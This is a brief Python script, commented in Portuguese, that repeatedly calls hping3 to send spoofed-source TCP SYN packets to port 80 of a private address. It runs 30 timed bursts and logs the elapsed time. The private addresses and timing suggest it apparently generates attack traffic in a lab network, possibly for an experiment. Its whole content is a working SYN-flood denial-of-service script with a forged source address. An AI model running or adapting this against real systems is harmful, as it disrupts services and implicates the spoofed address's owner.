import subprocess, time, sys

now = time.perf_counter()

time.sleep(30)

# -c: Numero de pacotes enviados.
c = 100
# -p: Porta de destino.
p = 80
# -i: Taxa de envio (u20000 = 20 pacotes por segundo).
i = "u20000"
# -S: Flag utilizada no ataque (SYN).
# -a: Endereço de spoof.

for j in range(30):
  subprocess.call(f'hping3 -c {c} -p {p} -i {i} -S -a 172.20.1.3 172.20.1.2', shell=True)
  sys.stdout.write(f'Tempo: {(time.perf_counter()-now):.2f}s\n')
  time.sleep(10)
